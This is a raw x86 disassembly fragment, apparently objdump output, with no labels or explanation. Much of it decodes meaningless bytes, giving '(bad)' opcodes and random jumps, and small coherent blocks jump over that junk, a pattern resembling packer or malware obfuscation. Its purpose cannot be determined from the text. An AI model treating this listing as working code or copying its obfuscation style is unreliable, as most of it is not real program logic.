  40e82f:	das    
  40e830:	ret    
  40e831:	jbe    0x40e89e
  40e833:	mov    esp,0x6deb8a4d
  40e838:	add    DWORD PTR ds:0xa5db2d6d,ebp
  40e83e:	scas   al,BYTE PTR es:[edi]
  40e83f:	jne    0x40e7e1
  40e841:	inc    edx
  40e842:	(bad)  
  40e843:	cli    
  40e844:	jae    0x40e89f
  40e846:	aas    
  40e847:	mov    edx,0xf5200ded
  40e84c:	jge    0x40e8c7
  40e84e:	dec    ebx
  40e84f:	in     al,dx
  40e850:	cmp    DWORD PTR [esi],eax
  40e852:	mov    esi,0x1876f9aa
  40e857:	push   esp
  40e858:	xchg   ebx,eax
  40e859:	out    dx,eax
  40e85a:	(bad)  
  40e85b:	(bad)  
  40e85c:	cld    
  40e85d:	sbb    bl,BYTE PTR [edx+0x27]
  40e860:	inc    eax
  40e861:	cli    
  40e862:	xchg   ebp,eax
  40e863:	ror    BYTE PTR [ebx+0xaf82ae7],1
  40e869:	jne    0x40e857
  40e86b:	fcomp  QWORD PTR ds:0x9f432209
  40e871:	jmp    edi
  40e873:	push   esi
  40e874:	cld    
  40e875:	xchg   ebp,eax
  40e876:	sub    dl,dl
  40e878:	ins    DWORD PTR es:[edi],dx
  40e879:	mov    ch,0x6a
  40e87b:	jnp    0x40e887
  40e87d:	mov    eax,0x7f6fe4bf
  40e882:	inc    BYTE PTR [edx+0xb]
  40e885:	mov    ds:0x5812e8cc,eax
  40e88a:	fldcw  WORD PTR [edi+0x6665a5fb]
  40e890:	retf   
  40e891:	imul   eax,edi,0x5ae4dc45
  40e897:	add    BYTE PTR [eax],al
  40e899:	add    ecx,eax
  40e89b:	jmp    0x40e977
  40e8a0:	lods   eax,DWORD PTR ds:[esi]
  40e8a1:	hlt    
  40e8a2:	mov    DWORD PTR [edx-0x27],edx
  40e8a5:	jg     0x40e8a6
  40e8a7:	inc    DWORD PTR ds:0x63dabc01
  40e8ad:	(bad)  
  40e8ae:	in     al,dx
  40e8af:	int    0xda
  40e8b1:	fwait
  40e8b2:	add    BYTE PTR [eax],al
  40e8b4:	mov    edi,0xa4000000
  40e8b9:	fnstcw WORD PTR [eax+0x73]
  40e8bc:	jecxz  0x40e86d
  40e8be:	dec    edi
  40e8bf:	add    al,0x92
  40e8c1:	fdivr  st,st(3)
  40e8c3:	adc    BYTE PTR [esi],dh
  40e8c5:	mov    dl,0xc3
  40e8c7:	sbb    eax,0x5e557970
  40e8cc:	aas    
  40e8cd:	mov    esp,0xd9d710ba
  40e8d2:	mov    ebx,0x28020fad
  40e8d7:	and    edi,DWORD PTR [eax+0x747c4b26]
  40e8dd:	sbb    dh,bl
  40e8df:	neg    DWORD PTR [ebx-0x7c]
  40e8e2:	ins    DWORD PTR es:[edi],dx
  40e8e3:	xchg   ebx,eax
  40e8e4:	sbb    BYTE PTR [ecx],dl
  40e8e6:	mov    al,0x63
  40e8e8:	xchg   DWORD PTR [eax-0x32edf7e2],ebx
  40e8ee:	mov    eax,esi
  40e8f0:	and    edi,DWORD PTR [ecx+0x44]
  40e8f3:	dec    ebx
  40e8f4:	in     al,dx
  40e8f5:	inc    esi
  40e8f6:	sub    BYTE PTR [eax-0x6281c74e],dh
  40e8fc:	sbb    esp,DWORD PTR [eax+eax*2+0x10]
  40e900:	mov    ecx,0x50725097
  40e905:	jbe    0x40e927
  40e907:	cmp    BYTE PTR [eax+0x763614f7],ch
  40e90d:	mov    esi,esp
  40e90f:	icebp  
  40e910:	inc    edx
  40e911:	pop    es
  40e912:	pop    eax
  40e913:	data16 cmp BYTE PTR [ebp-0x3de1bb8c],cl
  40e91a:	(bad)  
  40e91b:	mov    ds:0x36ef28f1,al
  40e920:	ds mov esp,0x454290c
  40e926:	fidiv  DWORD PTR [edi+0x23afa278]
  40e92c:	daa    
  40e92d:	or     dl,cl
  40e92f:	pop    ss
  40e930:	sahf   
  40e931:	pop    eax
  40e932:	fwait
  40e933:	push   0xed241a0e
  40e938:	push   ebx
  40e939:	ss jno 0x40e8c3
  40e93c:	and    dl,bl
  40e93e:	jl     0x40e938
  40e940:	and    ebp,DWORD PTR [edx-0x77153852]
  40e946:	mov    ch,bl
  40e948:	cmc    
  40e949:	pushf  
  40e94a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e94b:	ds pop ebx
  40e94d:	push   esi
  40e94e:	in     al,dx
  40e94f:	and    dh,dh
  40e951:	test   DWORD PTR [edx+eiz*2-0x28],esp
  40e955:	test   al,0x27
  40e957:	cld    
  40e958:	(bad)
  40e95b:	add    DWORD PTR [esi],esp
  40e95d:	popf   
  40e95e:	std    
  40e95f:	inc    ebp
  40e960:	test   al,0x3a
  40e962:	add    BYTE PTR [ebp+ebp*2-0x15a6e572],0xd5
  40e96a:	cmp    DWORD PTR [edi+0x70de8f36],edi
  40e970:	push   0x5b
  40e972:	int    0x86
  40e974:	int3   
  40e975:	jae    0x40e925
  40e977:	mov    DWORD PTR [ebp-0x28],0x8e2
  40e97e:	mov    eax,DWORD PTR [ebp-0x28]
  40e981:	mov    ecx,DWORD PTR [ebp-0x24]
  40e984:	xor    eax,0x1c70
  40e989:	xor    DWORD PTR ds:0x4335b8,0x7ca7
  40e993:	imul   eax,ecx
  40e996:	mov    ecx,DWORD PTR [ebp-0x20]
  40e999:	and    DWORD PTR ds:0x4335e4,0x3fb5
  40e9a3:	xor    eax,0x2bd0
  40e9a8:	add    DWORD PTR ds:0x433614,0x433568
  40e9b2:	or     eax,ecx
  40e9b4:	jmp    0x40ea90
  40e9b9:	test   BYTE PTR ds:0xfeff7ef7,bl
  40e9bf:	(bad)  
  40e9c0:	jmp    FWORD PTR [esi-0x51]
  40e9c3:	sbb    DWORD PTR [edi+0xdf2bc58],ebx
  40e9c9:	cdq    
  40e9ca:	pushf  
  40e9cb:	add    BYTE PTR [eax],al
  40e9cd:	mov    edi,0xe3000000
  40e9d2:	jbe    0x40ea2d
  40e9d4:	push   ebx
  40e9d5:	fisubr DWORD PTR [ecx]
  40e9d7:	popf   
  40e9d8:	inc    esp
  40e9d9:	sar    DWORD PTR [ebx-0x14],0x6a
  40e9dd:	push   edi
  40e9de:	dec    ecx
  40e9df:	ins    DWORD PTR es:[edi],dx
  40e9e0:	in     eax,0x6d
  40e9e2:	cmp    al,0x2
  40e9e4:	js     0x40e9fd
  40e9e6:	jns    0x40e99c
  40e9e8:	adc    DWORD PTR [edi-0x31],ebp
  40e9eb:	jns    0x40ea18
  40e9ed:	or     al,0x1c
  40e9ef:	xor    DWORD PTR [ebp-0x2f],ecx
  40e9f2:	(bad)  
  40e9f3:	inc    edi
  40e9f4:	arpl   WORD PTR [ecx+edi*2-0x22],sp
  40e9f8:	push   esi
  40e9f9:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9fb:	sub    BYTE PTR [bx+di-0x6603],ah
  40ea00:	loopne 0x40e9d1
  40ea02:	dec    eax
  40ea03:	dec    ecx
  40ea04:	or     ebx,ecx
  40ea06:	xchg   esp,eax
  40ea07:	mov    cl,0x66
  40ea09:	nop
  40ea0a:	cli    
  40ea0b:	imul   esi,DWORD PTR [esi],0xf4049b46
  40ea11:	jbe    0x40ea50
  40ea13:	mov    ebx,DWORD PTR [esi+0x46]
  40ea16:	xor    edi,esp
  40ea18:	(bad)  [edx-0x71]
  40ea1b:	adc    al,0x1a
  40ea1d:	push   ds
  40ea1e:	dec    esp
  40ea1f:	mov    ebp,0xf1d84412
  40ea24:	ret    0x97d5
  40ea27:	mov    ds,WORD PTR [eax+0x7f]
  40ea2a:	test   BYTE PTR [ebx+0x51],dh
  40ea2d:	push   esp
  40ea2e:	jmp    0xc299:0xd20e032b
  40ea35:	jge    0x40e9cf
  40ea37:	pop    edi
  40ea38:	pushf  
  40ea39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea3a:	popa   
  40ea3b:	sub    dl,BYTE PTR [ecx]
  40ea3d:	leave  
  40ea3e:	add    al,0xa8
  40ea40:	sbb    edx,eax
  40ea42:	mov    esp,ebp
  40ea44:	add    DWORD PTR [edx+0xd],esi
  40ea47:	jp     0x40ea49
  40ea49:	cmp    ebp,DWORD PTR ss:[ecx]
  40ea4c:	add    al,0x5e
  40ea4e:	mov    bh,bh
  40ea50:	loopne 0x40eaba
  40ea52:	repz push esi
  40ea54:	xchg   esp,eax
  40ea55:	jb     0x40ea76
  40ea57:	sti    
  40ea58:	inc    esi
  40ea59:	push   edi
  40ea5a:	shr    BYTE PTR [edx-0x3e],cl
  40ea5d:	and    dl,BYTE PTR [ebp+edi*2-0x6e]
  40ea61:	mov    bl,0xf4
  40ea63:	leave  
  40ea64:	cmp    BYTE PTR ss:[edx+0x41065421],0x7c
  40ea6c:	dec    esi
  40ea6d:	xchg   esp,eax
  40ea6e:	retf   
  40ea6f:	imul   esi,DWORD PTR [ecx+0x7b2aae91],0x10
  40ea76:	das    
  40ea77:	ror    dh,1
  40ea79:	mul    BYTE PTR [edx+0x5934e046]
  40ea7f:	mov    al,ds:0x51b023aa
  40ea84:	shr    BYTE PTR [ebx],0xf1
  40ea87:	popa   
  40ea88:	or     al,0x99
  40ea8a:	fdiv   DWORD PTR [ebp+0x67]
  40ea8d:	and    BYTE PTR [ebx-0x1bb27476],al
  40ea93:	add    DWORD PTR ds:0x43354c,0x433604
  40ea9d:	or     eax,ecx
  40ea9f:	cmp    DWORD PTR ds:0x433628,0x0
  40eaa6:	jb     0x40eae5
  40eaac:	mov    ecx,DWORD PTR ds:0x4335cc
  40eab2:	sbb    DWORD PTR ds:0x43364c,ecx
  40eab8:	jmp    0x40eae5
  40eabd:	push   DWORD PTR [ebp-0xc]
  40eac0:	push   DWORD PTR [ebp-0xc]
  40eac3:	push   0x42eca2
  40eac8:	push   0x6895
  40eacd:	push   0x392e
  40ead2:	push   0x1de8
  40ead7:	push   DWORD PTR [ebp-0x20]
  40eada:	push   0x7cfd
  40eadf:	call   DWORD PTR ds:0x43c830
  40eae5:	mov    ecx,0x74dffff
  40eaea:	sub    ecx,eax
  40eaec:	mov    DWORD PTR [ebp-0x20],ecx
  40eaef:	mov    DWORD PTR [ebp-0x28],0xcb5
  40eaf6:	mov    eax,DWORD PTR [ebp-0x28]
  40eaf9:	movzx  ecx,BYTE PTR ds:0x433650
  40eb00:	and    DWORD PTR ds:0x4335d4,ecx
  40eb06:	jmp    0x40ebe2
  40eb0b:	in     eax,dx
  40eb0c:	cmp    al,0xe2
  40eb0e:	xchg   edx,eax
  40eb0f:	repz fdivp st(5),st
  40eb12:	jg     0x40eb01
  40eb14:	or     eax,edx
  40eb16:	dec    esi
  40eb17:	cmc    
  40eb18:	ficom  WORD PTR [edx+0xf]
  40eb1b:	pop    eax
  40eb1c:	popf   
  40eb1d:	add    BYTE PTR [eax],al
  40eb1f:	mov    edi,0x19000000
  40eb24:	adc    eax,0x795a7954
  40eb29:	jp     0x40eabd
  40eb2b:	cmc    
  40eb2c:	(bad)  
  40eb2d:	mov    dl,ch
  40eb2f:	add    eax,0x85453200
  40eb34:	xchg   ebx,eax
  40eb35:	xchg   ebx,eax
  40eb36:	xor    dh,bh
  40eb38:	and    esp,0x49
  40eb3b:	call   0x4d724f6e
  40eb40:	mov    bh,0x78
  40eb42:	jnp    0x40eb73
  40eb44:	sbb    BYTE PTR [edx],ch
  40eb46:	addr16 mov ebp,0xc1c09ba7
  40eb4c:	fdiv   QWORD PTR [ebp+ebx*4-0x33d5d519]
  40eb53:	dec    edi
  40eb54:	mov    ebx,0x11a53bd8
  40eb59:	xchg   esp,eax
  40eb5a:	stc    
  40eb5b:	sub    al,0x2a
  40eb5d:	in     al,0x8b
  40eb5f:	mov    ah,bh
  40eb61:	xor    ebp,DWORD PTR [ebx+0x37aca8f5]
  40eb67:	into   
  40eb68:	and    al,0x51
  40eb6a:	mov    dh,0xc8
  40eb6c:	cwde   
  40eb6d:	inc    eax
  40eb6e:	test   edx,ebx
  40eb70:	jmp    0xf577:0x63c39563
  40eb77:	mov    eax,0xa8a0acea
  40eb7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb7d:	mov    ebp,0xf0f85c7
  40eb82:	mov    cl,0xc6
  40eb84:	xchg   ebp,eax
  40eb85:	shl    BYTE PTR [edx],1
  40eb87:	push   ds
  40eb88:	jo     0x40eb3a
  40eb8a:	mov    ebx,0x270e208a
  40eb8f:	test   DWORD PTR [edi],edi
  40eb91:	loop   0x40eb67
  40eb93:	out    dx,eax
  40eb94:	(bad)  
  40eb95:	enter  0x14ff,0x6c
  40eb99:	jge    0x40eb9c
  40eb9b:	mov    esi,0xb1696873
  40eba0:	call   0x2922:0x4de481af
  40eba7:	fdivr  DWORD PTR [edx-0x206e14a2]
  40ebad:	xor    eax,0x1f6a6e0e
  40ebb2:	add    eax,0x9488b4a1
  40ebb7:	aaa    
  40ebb8:	mov    bl,0xe5
  40ebba:	fadd   DWORD PTR [eax-0x75]
  40ebbd:	xchg   BYTE PTR [edi+0x1a],ch
  40ebc0:	outs   dx,DWORD PTR ds:[esi]
  40ebc1:	add    BYTE PTR [ebx],0x6f
  40ebc4:	retf   
  40ebc5:	and    DWORD PTR [esi],eax
  40ebc7:	fwait
  40ebc8:	inc    edx
  40ebc9:	pop    es
  40ebca:	stos   DWORD PTR es:[edi],eax
  40ebcb:	xor    edx,ebx
  40ebcd:	stc    
  40ebce:	xchg   DWORD PTR [ecx+0x49e1b94e],edx
  40ebd4:	out    dx,al
  40ebd5:	or     edi,DWORD PTR gs:[esp+ebp*4+0x2b]
  40ebda:	xor    esp,DWORD PTR [ebx+edx*8+0x6effc99e]
  40ebe1:	jl     0x40ec10
  40ebe3:	repz or al,0x0
  40ebe6:	add    BYTE PTR [ecx+0x64ccc1],al
  40ebec:	add    cl,ch
  40ebee:	xlat   BYTE PTR ds:[ebx]
  40ebef:	add    BYTE PTR [eax],al
  40ebf1:	add    BYTE PTR [ebp-0x56807e64],dh
  40ebf7:	jg     0x40ebf8
  40ebf9:	faddp  st(3),st
  40ebfb:	cwde   
  40ebfc:	adc    ah,BYTE PTR [ecx+0x675203fe]
  40ec02:	pop    ss
  40ec03:	sahf   
  40ec04:	add    BYTE PTR [eax],al
  40ec06:	mov    edi,0xeb000000
  40ec0b:	popa   
  40ec0c:	mov    eax,0xaa308dbe
  40ec11:	add    al,0xe1
  40ec13:	in     al,0xbf
  40ec15:	and    esi,DWORD PTR [ecx+0x6161ab8c]
  40ec1b:	aas    
  40ec1c:	retf   
  40ec1d:	pandn  mm2,QWORD PTR [edx-0x47]
  40ec21:	pop    edx
  40ec22:	(bad)  
  40ec23:	and    al,0xbb
  40ec25:	push   edi
  40ec26:	nop
  40ec27:	stos   BYTE PTR es:[edi],al
  40ec28:	dec    ebp
  40ec29:	add    al,BYTE PTR gs:[ecx]
  40ec2c:	je     0x40ebd3
  40ec2e:	popa   
  40ec2f:	iret   
  40ec30:	lods   eax,DWORD PTR ds:[esi]
  40ec31:	or     bl,BYTE PTR [edi+eax*8]
  40ec34:	mov    esi,0xdf8ef863
  40ec39:	xor    eax,0xce25f468
  40ec3e:	sub    edx,DWORD PTR [edi+ebp*1+0x27]
  40ec42:	jnp    0x40ec37
  40ec44:	sahf   
  40ec45:	or     al,0xa9
  40ec47:	fwait
  40ec48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec49:	mov    esp,0xb043f70d
  40ec4e:	adc    ebx,DWORD PTR [esi-0x1f]
  40ec51:	xor    ecx,ebp
  40ec53:	mov    ds:0x187baebb,eax
  40ec58:	mov    edi,ecx
  40ec5a:	sbb    eax,0x99f03ae4
  40ec5f:	cld    
  40ec60:	psubsw mm5,QWORD PTR [edx]
  40ec63:	or     cl,BYTE PTR [edi-0x64]
  40ec66:	jae    0x40eca5
  40ec68:	fadd   QWORD PTR cs:[esi]
  40ec6b:	jecxz  0x40ebf1
  40ec6d:	jle    0x40ec64
  40ec6f:	scas   eax,DWORD PTR es:[edi]
  40ec70:	jno    0x40ec74
  40ec72:	ficomp DWORD PTR [esi]
  40ec74:	push   edi
  40ec75:	ja     0x40ec24
  40ec77:	gs pop ecx
  40ec79:	or     DWORD PTR [ebp-0x3e63ed1e],esi
  40ec7f:	shl    eax,0x22
  40ec82:	mov    eax,ds:0x44276257
  40ec87:	or     BYTE PTR [edi+eiz*2+0x3ae1ada0],0x2d
  40ec8f:	xlat   BYTE PTR ds:[ebx]
  40ec90:	cmp    al,0x19
  40ec92:	jle    0x40ecb0
  40ec94:	scas   al,BYTE PTR es:[edi]
  40ec95:	xor    eax,0xc21f9fcd
  40ec9a:	mov    DWORD PTR [ebp-0x3fe8c5fe],ebp
  40eca0:	cmp    DWORD PTR [ebp+0xb],edi
  40eca3:	add    eax,0xffde88d
  40eca8:	arpl   cx,cx
  40ecaa:	in     eax,dx
  40ecab:	sbb    al,0x32
  40ecad:	imul   ebx,DWORD PTR [eax-0x14],0x29ac627c
  40ecb4:	cld    
  40ecb5:	jle    0x40ec41
  40ecb7:	and    eax,0xfff16cb9
  40ecbc:	sub    dl,BYTE PTR [esi]
  40ecbe:	int    0xa6
  40ecc0:	sub    DWORD PTR ds:0xfe833e8d,eax
  40ecc6:	add    al,0x83
  40ecc8:	jp     0x40ecd7
  40ecca:	(bad)  
  40eccb:	sub    al,BYTE PTR [eax]
  40eccd:	add    BYTE PTR [ecx+0xe8ed9],al
  40ecd3:	add    BYTE PTR [edx-0x2],ch
  40ecd6:	pop    ecx
  40ecd7:	sub    ecx,eax
  40ecd9:	mov    DWORD PTR [ebp-0x10],ecx
  40ecdc:	sub    ecx,eax
  40ecde:	mov    DWORD PTR [ebp-0x24],0x4f03
  40ece5:	mov    DWORD PTR [ebp-0x28],0x9b8
  40ecec:	adc    DWORD PTR ds:0x43364c,edx
  40ecf2:	mov    eax,DWORD PTR [ebp-0x28]
  40ecf5:	and    DWORD PTR ds:0x433574,0x35cd
  40ecff:	mov    ecx,DWORD PTR [ebp-0x24]
  40ed02:	jmp    0x40edde
  40ed07:	mov    ebp,esi
  40ed09:	and    ecx,esp
  40ed0b:	jge    0x40ed02
  40ed0d:	leave  
  40ed0e:	std    
  40ed0f:	fnstenv [edi-0x2e]
  40ed12:	fisub  DWORD PTR [ebx+edi*4-0x61295e49]
  40ed19:	add    BYTE PTR [eax],al
  40ed1b:	mov    edi,0x87000000
  40ed20:	xchg   BYTE PTR [edx+ebx*1],al
  40ed23:	xchg   ebp,eax
  40ed24:	sbb    al,0x3a
  40ed26:	bound  ebx,QWORD PTR [edi]
  40ed28:	pushf  
  40ed29:	mov    ebp,0x5dd63804
  40ed2e:	mov    edx,0x8f517e01
  40ed33:	mov    ?,WORD PTR [ebp+ebp*1-0x38da946]
  40ed3a:	ins    BYTE PTR es:[edi],dx
  40ed3b:	jp     0x40ed33
  40ed3d:	jnp    0x40ed9c
  40ed3f:	aaa    
  40ed40:	adc    al,0x4a
  40ed42:	dec    esp
  40ed43:	das    
  40ed44:	cmc    
  40ed45:	push   ds
  40ed46:	sbb    al,0x1a
  40ed48:	jmp    0x40ece4
  40ed4a:	iret   
  40ed4b:	scas   eax,DWORD PTR es:[edi]
  40ed4c:	sahf   
  40ed4d:	dec    eax
  40ed4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed4f:	call   0x4c13:0xb38ced0a
  40ed56:	push   0x56856f23
  40ed5b:	scas   al,BYTE PTR es:[edi]
  40ed5c:	mov    edi,0xf0c0bd7c
  40ed61:	(bad)  
  40ed63:	bound  ecx,QWORD PTR [edi]
  40ed65:	nop
  40ed66:	inc    esi
  40ed67:	adc    ch,BYTE PTR [edx-0x43]
  40ed6a:	ins    BYTE PTR es:[edi],dx
  40ed6b:	je     0x40ed58
  40ed6d:	adc    eax,DWORD PTR [edi+0x79]
  40ed70:	ja     0x40ed6c
  40ed72:	leave  
  40ed73:	jae    0x40ed49
  40ed75:	lahf   
  40ed76:	and    eax,0xd7c644d9
  40ed7b:	push   edx
  40ed7c:	jp     0x40ede1
  40ed7e:	xor    ch,BYTE PTR [esi-0x5cc0a50e]
  40ed84:	fwait
  40ed85:	rol    esp,1
  40ed87:	sbb    DWORD PTR [esi+ebp*2-0x799308cb],edi
  40ed8e:	aam    0x35
  40ed90:	cmp    ebx,edx
  40ed92:	gs xchg ebx,eax
  40ed94:	mov    al,ds:0x86f493bb
  40ed99:	retf   
  40ed9a:	add    BYTE PTR [esi+0x1b],dh
  40ed9d:	add    dl,ch
  40ed9f:	add    DWORD PTR ds:0x63cd491a,0x5b
  40eda6:	xchg   edi,eax
  40eda7:	mov    al,ds:0xfd1010f0
  40edac:	shl    DWORD PTR [ebx+0xe05ecfd],0xfa
  40edb3:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40edb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edb6:	clc    
  40edb7:	fistp  DWORD PTR [esi-0x4bc5ad3a]
  40edbd:	fst    QWORD PTR [esp+ecx*2-0xac0698a]
  40edc4:	fistp  WORD PTR [ebp+0x56]
  40edc7:	fidiv  WORD PTR [ebx]
  40edc9:	inc    edi
  40edca:	pop    es
  40edcb:	mov    edi,0x9b48096c
  40edd0:	pop    ss
  40edd1:	into   
  40edd2:	sub    ebx,esp
  40edd4:	lods   al,BYTE PTR ds:[esi]
  40edd5:	ret    
  40edd6:	xor    ah,bh
  40edd8:	cs int3 
  40edda:	(bad)  [ecx+0x4d]
  40eddd:	add    DWORD PTR ds:0x6cc4,0x1581c10b
  40ede7:	xor    al,0x35
  40ede9:	inc    ebx
  40edea:	add    BYTE PTR [eax],dl
  40edec:	sub    BYTE PTR [eax],al
  40edee:	add    BYTE PTR ds:0x7f7f,ch
  40edf4:	and    ecx,DWORD PTR ds:0x433610
  40edfa:	mov    DWORD PTR [ebp-0x20],eax
  40edfd:	mov    DWORD PTR [ebp-0x1c],0x2fa9
  40ee04:	sub    eax,0x7bb8
  40ee09:	jmp    0x40eee5
  40ee0e:	cmp    bh,0x5e
  40ee11:	outs   dx,DWORD PTR ds:[esi]
  40ee12:	jg     0x40ee03
  40ee14:	mov    cl,0xff
  40ee16:	fadd   DWORD PTR [ecx]
  40ee18:	or     eax,0xd50be7c3
  40ee1d:	aas    
  40ee1e:	xchg   ebp,eax
  40ee1f:	lahf   
  40ee20:	add    BYTE PTR [eax],al
  40ee22:	mov    edi,0x81000000
  40ee27:	jge    0x40ee87
  40ee29:	adc    al,bh
  40ee2b:	or     edi,DWORD PTR [ecx-0x6604c483]
  40ee31:	adc    DWORD PTR [ebx-0xe602625],edx
  40ee37:	inc    ebx
  40ee38:	(bad)  
  40ee39:	into   
  40ee3a:	cmp    eax,0x606c392a
  40ee3f:	cld    
  40ee40:	jl     0x40ee3c
  40ee42:	inc    edi
  40ee43:	push   eax
  40ee44:	sub    esp,ebx
  40ee46:	pop    ecx
  40ee47:	ja     0x40eddc
  40ee49:	mov    ds:0x948eb91e,al
  40ee4e:	in     eax,0x1f
  40ee50:	outs   dx,BYTE PTR ds:[esi]
  40ee51:	loop   0x40ee19
  40ee53:	xchg   esi,eax
  40ee54:	or     al,0x24
  40ee56:	mov    dh,0x7f
  40ee58:	jmp    0x9a1e5a9f
  40ee5d:	sahf   
  40ee5e:	push   ebx
  40ee5f:	ins    BYTE PTR es:[edi],dx
  40ee60:	cld    
  40ee61:	xchg   ebp,eax
  40ee62:	adc    eax,0x13117b54
  40ee67:	neg    BYTE PTR [eax]
  40ee69:	adc    BYTE PTR [eax+0x51],ch
  40ee6c:	imul   edi,esi,0xffffff93
  40ee6f:	mov    ebx,0x6b4a56c
  40ee74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee75:	call   0x9691fcb3
  40ee7a:	pop    edi
  40ee7b:	(bad)  
  40ee7c:	push   ecx
  40ee7d:	lahf   
  40ee7e:	pop    edi
  40ee7f:	pop    ebx
  40ee80:	mov    ebp,DWORD PTR [ebp-0x1103ba9d]
  40ee86:	mov    dh,0x73
  40ee88:	sbb    ch,al
  40ee8a:	xchg   ecx,eax
  40ee8b:	and    ch,BYTE PTR [ecx-0xa]
  40ee8e:	mov    cs,WORD PTR [ebx-0x7e]
  40ee91:	leave  
  40ee92:	(bad)  
  40ee93:	hlt    
  40ee94:	lahf   
  40ee95:	retf   
  40ee96:	aas    
  40ee97:	xchg   ebx,eax
  40ee98:	in     al,dx
  40ee99:	test   esi,eax
  40ee9b:	and    BYTE PTR [ecx+0x7],dh
  40ee9e:	cdq    
  40ee9f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eea1:	mov    eax,ds:0xab6dabab
  40eea6:	shl    BYTE PTR [ebp+0x48],0xfd
  40eeaa:	in     al,dx
  40eeab:	pushf  
  40eeac:	dec    esi
  40eead:	push   0xb4d06474
  40eeb2:	add    esi,edi
  40eeb4:	outs   dx,DWORD PTR ds:[esi]
  40eeb5:	sub    cl,BYTE PTR [esi+0x7c83c340]
  40eebb:	enter  0xfb8d,0x67
  40eebf:	mov    DWORD PTR [ebx-0x76],ebx
  40eec2:	dec    ebx
  40eec3:	lods   eax,DWORD PTR ds:[esi]
  40eec4:	cmp    eax,DWORD PTR [ebp-0x1ca1c19e]
  40eeca:	and    DWORD PTR [ecx],ebx
  40eecc:	fist   DWORD PTR [esi-0x58]
  40eecf:	sub    ch,BYTE PTR [edi-0x21]
  40eed2:	xor    eax,0xdbf22394
  40eed7:	mov    BYTE PTR [esi],dh
  40eed9:	rol    DWORD PTR [ebx+edi*2],0x62
  40eedd:	sar    esi,0x7d
  40eee0:	popf   
  40eee1:	jbe    0x40ee76
  40eee3:	push   es
  40eee4:	mov    WORD PTR [ebp-0x20],0x2f
  40eeea:	add    BYTE PTR [eax],al
  40eeec:	sub    DWORD PTR ds:0x433564,ebx
  40eef2:	mov    DWORD PTR [ebp-0x24],0x4cab
  40eef9:	adc    eax,ecx
  40eefb:	jmp    0x40efd7
  40ef00:	sbb    DWORD PTR [ecx-0xe],ebx
  40ef03:	test   eax,0xf95babf2
  40ef08:	nop
  40ef09:	mov    eax,0xf313390
  40ef0e:	lahf   
  40ef0f:	gs push esp
  40ef11:	mov    al,ds:0xbf0000
  40ef16:	add    BYTE PTR [eax],al
  40ef18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef1a:	mov    ah,0xae
  40ef1c:	push   DWORD PTR [ebx]
  40ef1e:	inc    edi
  40ef1f:	scas   al,BYTE PTR es:[edi]
  40ef20:	pop    ebx
  40ef21:	jle    0x40ef54
  40ef23:	loopne 0x40ef71
  40ef25:	iret   
  40ef26:	fisttp QWORD PTR [esi-0x6]
  40ef29:	jge    0x40ef59
  40ef2b:	ss popa 
  40ef2d:	mov    ds:0x39da358c,eax
  40ef32:	retf   
  40ef33:	stc    
  40ef34:	icebp  
  40ef35:	arpl   WORD PTR [edx],bx
  40ef37:	mov    cl,ah
  40ef39:	push   esp
  40ef3a:	sbb    eax,0x5ee47c6a
  40ef3f:	test   al,0x21
  40ef41:	push   ss
  40ef42:	scas   al,BYTE PTR es:[edi]
  40ef43:	(bad)  
  40ef45:	bnd jb 0x40efc2
  40ef48:	out    0x2a,al
  40ef4a:	or     eax,0x29f72fda
  40ef4f:	outs   dx,DWORD PTR ds:[esi]
  40ef50:	out    dx,al
  40ef51:	sub    dh,0x90
  40ef54:	fcom   DWORD PTR [ebx+ebp*4]
  40ef57:	daa    
  40ef58:	mov    ah,0xfd
  40ef5a:	daa    
  40ef5b:	sbb    al,0xa5
  40ef5d:	sub    dh,al
  40ef5f:	and    al,0xbb
  40ef61:	inc    ebx
  40ef62:	push   ecx
  40ef63:	loopne 0x40ef90
  40ef65:	pop    esi
  40ef66:	pop    ebx
  40ef67:	(bad)  
  40ef68:	out    0x4e,al
  40ef6a:	das    
  40ef6b:	push   edx
  40ef6c:	sub    BYTE PTR [edx+0x63],ch
  40ef6f:	std    
  40ef70:	loope  0x40efa9
  40ef72:	ds std 
  40ef74:	call   0x398f0b62
  40ef79:	xor    edi,eax
  40ef7b:	dec    ebx
  40ef7c:	push   esi
  40ef7d:	inc    eax
  40ef7e:	daa    
  40ef7f:	lods   al,BYTE PTR ds:[esi]
  40ef80:	dec    edx
  40ef81:	xor    dh,BYTE PTR [edx]
  40ef83:	push   ebx
  40ef84:	mov    ch,BYTE PTR [esi]
  40ef86:	ror    DWORD PTR [eax+0x10],cl
  40ef89:	test   DWORD PTR [ebx-0x55],esp
  40ef8c:	dec    edi
  40ef8d:	or     BYTE PTR ds:0x36fc404c,ch
  40ef93:	cdq    
  40ef94:	aam    0xa0
  40ef96:	lea    esi,[ecx+0x21bf1fe6]
  40ef9c:	xor    edi,ebp
  40ef9e:	mov    ss,WORD PTR [ecx-0x6b]
  40efa1:	inc    ebp
  40efa2:	lds    ebp,FWORD PTR [edx-0x3b]
  40efa5:	icebp  
  40efa6:	jle    0x40efc9
  40efa8:	clc    
  40efa9:	mov    cs,WORD PTR cs:[esi]
  40efac:	jae    0x40ef3b
  40efae:	or     edx,edx
  40efb0:	loope  0x40f029
  40efb2:	xchg   esp,eax
  40efb3:	imul   edi,DWORD PTR ds:0x7efad89f,0xfffffff0
  40efba:	pop    ss
  40efbb:	inc    ebp
  40efbc:	lds    ebp,FWORD PTR [eax+0x428c1911]
  40efc2:	lods   eax,DWORD PTR ds:[esi]
  40efc3:	inc    esi
  40efc4:	xchg   BYTE PTR [ecx+0x10328c21],bl
  40efca:	outs   dx,BYTE PTR ds:[esi]
  40efcb:	mov    dl,0xc4
  40efcd:	xchg   BYTE PTR [ebp-0x5673f5a5],dl
  40efd3:	ds add eax,0x45c7d18e
